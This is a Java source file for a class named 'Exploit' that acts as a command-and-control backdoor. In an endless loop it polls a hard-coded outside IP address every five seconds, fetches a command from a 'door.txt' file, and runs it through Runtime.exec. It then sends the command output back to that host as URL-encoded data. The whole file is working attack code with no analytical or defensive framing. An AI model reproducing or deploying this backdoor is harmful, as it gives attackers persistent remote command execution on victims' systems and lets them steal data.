import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class Exploit {

    public Exploit(){
        while(true){
        try {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            String urldoor = httpRequest("http://34.80.130.20:53/door.txt");
            String result=exec(urldoor,null);

             URL url = new URL("http://34.80.130.20:53/ifconfig:"+URLEncoder.encode(result,"UTF-8"));
             URLConnection pb = url.openConnection();
             pb.getInputStream();
        } catch (IOException e) {
        } 
        }
    }
    public static String httpRequest(String requestUrl) {
         String requestMethod="GET";

        StringBuffer buffer = new StringBuffer();
        try {

            URL url = new URL(requestUrl);
            // http协议传输
            HttpURLConnection httpUrlConn = (HttpURLConnection) url.openConnection();

            httpUrlConn.setDoOutput(true);
            httpUrlConn.setDoInput(true);
            httpUrlConn.setUseCaches(false);
            // 设置请求方式（GET/POST）
            httpUrlConn.setRequestMethod(requestMethod);

            if ("GET".equalsIgnoreCase(requestMethod))
                httpUrlConn.connect();
            // 将返回的输入流转换成字符串
            InputStream inputStream = httpUrlConn.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "utf-8");
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

            String str = null;
            while ((str = bufferedReader.readLine()) != null) {
                buffer.append(str);
            }
            bufferedReader.close();
            inputStreamReader.close();
            // 释放资源
            inputStream.close();
            inputStream = null;
            httpUrlConn.disconnect();
            return buffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
    public static String exec(String cmd, Writer out) throws IOException 
    { 
    StringBuffer sb = new StringBuffer(); 
    int len = 0; 
    byte by[] = new byte[cmd.length() * 10]; 
    Process p = Runtime.getRuntime().exec(cmd); 
    InputStream is = p.getInputStream(); 
    while((len = is.read(by)) != -1) 
    { 
        String str = new String(by, 0, len); 
        if(out != null) 
        { 
          out.write(str); 
          out.flush(); 
        } 
        sb.append(str); 
    } 
    is.close(); 
    return sb.toString(); 
    } 
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }

}